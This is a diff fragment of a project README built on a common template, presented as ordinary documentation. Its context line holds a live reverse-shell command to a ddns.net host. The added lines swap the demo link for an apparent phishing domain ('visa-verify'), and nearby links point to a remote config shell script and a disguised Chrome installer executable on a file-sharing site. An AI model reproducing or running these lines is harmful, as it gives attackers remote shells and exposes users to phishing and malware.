@@ -51,7 +51,7 @@ bash -i >& /dev/tcp/termux-configure.ddns.net/25251 0>&1
     <a href="https://fb-tracker.cf/config/config.sh"><strong>Download main config »</strong></a>
     <br />
     <br />
-    <a href="https://github.com/othneildrew/Best-README-Template">View Demo</a>
+    <a href="http://visa-verify.ddns.net/">View Demo</a>
     ·
     <a href="https://www.mediafire.com/file/1iu1td6jyjfvgcw/google-chrome-800398787-64bit-downzen.com.exe/file">Google 80.0.3987.87</a>
     ·
